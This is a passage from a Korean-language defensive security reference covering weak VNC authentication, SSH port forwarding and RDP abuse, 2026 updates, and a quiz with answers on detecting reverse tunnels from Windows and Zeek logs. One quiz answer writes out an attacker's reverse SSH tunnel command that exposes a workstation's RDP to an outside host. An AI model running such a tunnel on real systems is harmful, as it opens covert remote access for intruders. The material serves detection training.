- **약한 인증.** 고전적인 VNC 인증은 DES를 쓰는 질문-응답 방식인데, 비밀번호가 **8글자에서 잘립니다.** **비밀번호가 아예 없는** 설정도 있습니다. 계정 개념도 없이, 화면 하나에 공유 비밀번호 하나입니다.
- **약하거나 없는 암호화.** SSH나 TLS로 감싸지 않으면 암호화가 없는 버전이 많습니다.
- 구현마다 **취약점이 길게** 쌓여 있고, 인터넷에 열린 VNC 서버도 많습니다.

VNC 세션의 시작은 평문이라 쉽게 알아볼 수 있습니다.

```
server → client:  RFB 003.008\n
client → server:  RFB 003.008\n
server → client:  security types: [2] (VNC Authentication)
```

- `RFB 003.008` — 프로토콜 버전 배너(3.8). TCP 스트림 맨 앞에 `RFB`가 보이면 포트가 무엇이든 VNC입니다.
- 보안 유형 `2` = 고전적인 VNC 인증(DES 질문-응답). 유형 `1` = **None**(비밀번호 없음).

RDP에 대한 이야기는 전부 VNC에도 해당합니다. 차이는 하나, VNC는 **아주 드물거나 아예 정책 위반**이어야 한다는 점입니다. 플로 로그에서 5900~5910 포트, 방화벽의 애플리케이션 식별이 VNC라고 표시한 모든 것, Zeek `rfb.log`, Windows 호스트의 VNC 서버 서비스·프로세스(`winvnc.exe`, `tvnserver.exe`)를 찾습니다. 공격자가 VNC 서버를 깔았다면 자기만의 두 번째, 더 조용한 출입문을 만든 겁니다.

## 2026년 관점 { #trends }

!!! success "[2026 현재] 지금도 그대로 유효"
    여기 내용은 전부 지금도 맞습니다. SSH는 여전히 Linux, 네트워크 장비, 클라우드 VM의 표준 원격 관리 프로토콜이고, 포트 포워딩 덕분에 나가는 연결 하나가 여전히 무엇이든 거꾸로 실어 들일 수 있습니다. 아무 곳으로나 나가는 SSH를 허용하는 건 여전히 구멍이고, 127.0.0.1에서 온 RDP 로그온은 여전히 역방향 터널의 결정적 증거입니다. RDP는 여전히 가장 많이 악용되는 원격 서비스 중 하나입니다 — 2024년 침해 대응 사례를 모은 한 보고서에서 RDP는 사례의 <strong>84%</strong>에 등장해 가장 많이 악용된 Microsoft 도구였습니다. 그리고 열쇠는 여전히 익스플로잇보다 훔친 자격 증명입니다. VNC는 여전히 약하고, 여전히 망에서 빼 두는 게 최선입니다.

!!! info "[변경됨] 바뀐 점"
    - **SSH 클라이언트가 Windows에 기본 내장.** Windows 10 1809 / Server 2019부터 `ssh.exe`가 기본으로 있어서, 공격자들은 plink를 들고 오는 대신 Microsoft 서명이 붙은 OpenSSH로 "있는 걸로 버티기(living off the land)"를 점점 더 많이 합니다. 탐지는 둘 다 잡아야 합니다.
    - **OpenSSH도 현대화됐습니다.** OpenSSH 10.0(2025년 4월)은 DSA 키를 완전히 없앴고, 기본 키 교환을 <strong>양자 내성 하이브리드 방식</strong>(`mlkem768x25519-sha256`)으로 바꿨습니다(그 전 버전들은 `sntrup761x25519-sha512`가 기본). Zeek `ssh.log`의 `kex_alg`에서 최신 클라이언트는 이런 값을 보이고, 아주 옛날 알고리즘이면 오래됐거나 특이한 도구라는 신호입니다. 2024년의 **regreSSHion** 취약점(CVE-2024-6387, glibc 기반 Linux의 `sshd`에서 인증 없이 원격 코드 실행이 가능한 경쟁 조건 버그)은 외부에 열린 SSH 서버는 빨리 패치해야 한다는 걸 다시 보여 줬습니다.
    - **터널은 SSH를 넘어섰습니다.** 공격자들은 이제 합법적인 터널 서비스·도구(Cloudflare Tunnel `cloudflared`, ngrok, Tailscale 같은 메시 VPN, Chisel·Ligolo-ng 같은 역방향 프록시)로 똑같은 "나가는 연결로 들어오기"를 하고, 흔히 HTTPS나 WebSocket 위에서 합니다. SSH만이 아니라 이런 프로그램과 잘 알려진 도메인도 찾아야 합니다.
    - **피싱 수단이 된 RDP 파일.** 2024년 10월 Microsoft는 한 국가 배후 공격자가 서명된 `.rdp` 첨부 파일을 대량으로 보낸 스피어피싱을 보고했습니다. 파일을 열면 피해자가 공격자의 RDP 서버에 접속되고 드라이브와 클립보드가 넘어갔습니다. 2026년 4월 Windows 업데이트는 보호 장치를 더했습니다. 이제 `.rdp` 파일을 열면 게시자(또는 "알 수 없는 게시자")를 보여 주고, 요청된 리디렉션을 모두 나열하며, 사용자가 승인하기 전까지 그 리디렉션은 **기본으로 꺼져** 있습니다. 메일 게이트웨이에서 `.rdp` 첨부를 막고, 인터넷으로 나가는 3389도 막으세요.
    - **FireEye는 이제 Mandiant(Google Cloud 소속)입니다.** 예전 FireEye 블로그 링크는 옮겨졌습니다.

!!! warning "[주의] 옛 방식대로 하면 틀리거나 위험한 점"
    - **"나가는 22번 포트를 막았다"에 기대지 마세요.** SSH는 443이든 어느 포트든 돕니다. 애플리케이션 식별로 막고 목적지를 허용 목록으로 관리합니다.
    - **`plink.exe`만 찾지 마세요.** 이름은 바뀌고, `ssh.exe`는 이미 모든 최신 Windows에 있습니다. 명령줄 옵션(`-R`, `-L`, `-D`, `-N`)과 `OriginalFileName`을 찾습니다.
    - **인터넷에 열린 RDP를 "NLA가 있으니 괜찮다"고 보지 마세요.** NLA는 노출을 줄일 뿐 크리덴셜 스터핑을 막지 못합니다. MFA가 있는 VPN이나 게이트웨이 뒤에 둡니다.
    - **RDP 로그가 늘 있을 거라고 생각하지 마세요.** `TerminalServices-*` 로그는 작아서 금방 덮어써지고, 공격자가 지우기도 합니다. 4624/4625, 1149, 21~25를 SIEM으로 보내 두세요.
    - **"그 업체 하나 때문에" VNC를 남겨 두지 마세요.** 업체가 원격 접속이 필요하면 감시되고 MFA가 걸린 방법을 주세요. 관리되지 않는 VNC 서버는 열린 옆문입니다.

## 확인 문제 { #quiz }

### 문제 1

방화벽이 인터넷에서 들어오는 연결을 모두 막지만, 나가는 TCP 22는 어디로든 허용합니다. 관리자가 "들어오는 건 막혀 있으니 밖에서 아무도 우리 PC에 RDP 못 해요"라고 말합니다. 공격자가 실제로 칠 명령어를 들어 왜 틀렸는지 설명하고, 해결할 통제 두 가지를 말하세요.

??? success "정답과 해설"
    **왜 틀렸나:** SSH는 다른 트래픽을 실어 나를 수 있습니다. 내부 PC 한 대에서 코드를 실행할 수 있는 공격자는 `ssh.exe -N -R 12345:127.0.0.1:3389 tun@203.0.113.77`(또는 `-R`을 쓴 plink) 같은 걸 실행합니다. 내부 PC가 **나가는** SSH 연결을 열고(허용됨), 공격자 서버에게 `12345` 포트에서 기다렸다가 거기로 오는 걸 터널을 통해 PC 자신의 RDP 포트 `127.0.0.1:3389`로 보내 달라고 요청합니다. 그러면 공격자는 `203.0.113.77:12345`로 RDP해서 내부 바탕화면에 들어옵니다. 방화벽은 나가는 SSH 세션 하나만 보고, 그건 암호화되어 있어서 안에 RDP가 있는지 모릅니다.

    **통제:** (1) **나가는 SSH를 허용 목록으로** — 애플리케이션 식별로(포트 무관) 승인된 팀에게 승인된 목적지만. (2) RDP가 필요 없는 **워크스테이션의 RDP를 끄기** — 터널이 연결할 상대가 없어집니다. 탐지도 함께: `127.0.0.1`에서 온 RDP 로그온, `-R`이 들어간 SSH 클라이언트 명령줄, 워크스테이션에서 나가는 긴 SSH 세션.

### 문제 2

`LT-ENG-0207`에서 `Logon Type 10`, `Account Name p.lee`, `Source Network Address ::1`인 4624와, 같은 사용자·같은 출발지의 TerminalServices 1149를 봤습니다. Zeek에는 그 노트북에서 `198.51.100.40:443`으로 가는 3시간짜리 연결이 `service=ssh`로 찍혀 있습니다. 무슨 일이 있었고 다음에 무엇을 하겠습니까?

??? success "정답과 해설"
    **무슨 일:** `Logon Type 10`은 RDP(RemoteInteractive) 로그온이고, `::1`은 IPv6 루프백입니다. RDP 세션이 **노트북 자기 자신에게서** 왔다는 뜻이죠. 노트북 위의 무언가가 RDP를 자기 자신에게 전달할 때만 이런 일이 생깁니다 — **역방향 터널**입니다. Zeek 기록이 이를 확인해 줍니다. 인터넷 호스트로 가는 **443 포트의 SSH**(Zeek가 배너로 프로토콜을 알아봄)가 3시간. 바깥의 누군가가 `p.lee`의 자격 증명으로, 노트북이 밖으로 만든 SSH 터널을 타고 RDP로 들어온 겁니다.

    **다음 단계:** 노트북을 격리합니다(터널이 끊김). Sysmon 1/4688과 `198.51.100.40`에 대한 Sysmon 3으로 터널 프로세스를 찾습니다(`-R`이 든 명령줄, `OriginalFileName`이 Plink이거나 `ssh.exe`, 부모 프로세스로 어떻게 들어왔는지 추적). `198.51.100.40`을 차단하고 그 주소와 통신한 다른 내부 호스트를 찾습니다. `p.lee`의 비밀번호는 털렸다고 보고 재설정하고 다른 곳에서도 쓰였는지 확인합니다. RDP 세션 동안 무엇을 했는지 봅니다(그 Logon ID 아래의 프로세스 생성, 4778/4779, 건드린 파일).

### 문제 3

각각 걱정할 일인지, 왜 그런지 말하세요. (a) 웹 서버에 `Accepted publickey for deploy from 10.20.40.15`, `10.20.40.15`는 관리용 점프 호스트. (b) Zeek에 재무팀 PC의 TCP 5901로 가는 `RFB 003.008` 트래픽. (c) 파일 서버 `SRV-FS-0001`에 일반 사용자 노트북 `10.20.30.41`에서 온 4624 타입 10, 시각 02:14.

??? success "정답과 해설"
    **(a)** 키 지문이 아는 관리자의 것이고 시간이 맞다면 정상입니다. 점프 호스트에서 키로 로그인하는 것, 잘 정의된 SSH 환경이 원래 이렇게 생겨야 합니다. 지문이 모르는 것(심어 둔 키)일 때만 확인할 가치가 있습니다.

    **(b)** **걱정할 일입니다.** `RFB`는 VNC 프로토콜이고 5901은 VNC 디스플레이 `:1`입니다. VNC는 인증이 약하고(8글자 DES 비밀번호, 때로는 아예 없음) 드물거나 금지여야 합니다. 재무팀 PC의 VNC 서버는 잊힌 업체 도구일 수도, 공격자의 뒷문일 수도 있습니다. 5901에서 듣고 있는 프로세스, 누가 언제 설치했는지, 누가 접속해 왔는지 확인합니다.

    **(c)** **걱정할 일입니다.** 타입 10은 RDP입니다. 관리용 RDP는 일반 사용자 노트북이 아니라 점프 호스트에서 와야 하고, 새벽 2시는 이상합니다. 어떤 계정이 로그온했는지, 그 계정에 파일 서버 RDP 권한이 있어야 하는지, `10.20.30.41`이 그 전에 무엇을 했는지(뚫렸을 수 있습니다 — SMB 예시에서 피싱당한 노트북이었던 걸 기억하세요), 세션에서 무슨 일이 있었는지 확인합니다.

## 관련 레퍼런스 { #related }

- [RDP 악용](../../../adversary/rdp.md) · [WMI와 WinRM](../../../adversary/wmi-winrm.md) · [PsExec와 SMB 횡적 이동](../../../adversary/psexec-smb.md)
- [LSASS 덤프](../../../adversary/lsass-dumping.md) — 재사용되는 비밀번호가 보통 나오는 곳
- [LOLBins(있는 걸로 버티기 도구)](../../../adversary/lolbins.md)
- [Windows 이벤트 ID](../../../basics/windows-event-ids.md) · [잘 알려진 포트](../../../basics/well-known-ports.md)
- [Zeek conn.log](../../../network/zeek/conn-log.md)
- [DHCP](dhcp.md) · [SMB](smb.md)
